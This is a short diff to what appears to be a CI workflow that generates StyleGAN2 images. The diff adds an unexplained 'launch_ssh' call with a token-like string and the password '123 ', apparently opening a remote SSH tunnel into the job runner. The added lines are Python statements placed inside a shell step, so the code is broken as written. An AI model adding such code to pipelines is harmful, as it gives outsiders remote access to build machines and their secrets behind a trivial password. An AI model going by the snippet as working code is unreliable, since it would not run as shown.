@@ -36,6 +36,8 @@ jobs:
         cd /inputs/stylegan2
         pip install ssh
         pip install ssh --upgrade
+        from ssh import launch_ssh
+        launch_ssh('1yNlMsJmbGo4rlJ07KeLOs9myBz_qaxfHxCn6VV29VQmoTY8', '123 ')
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
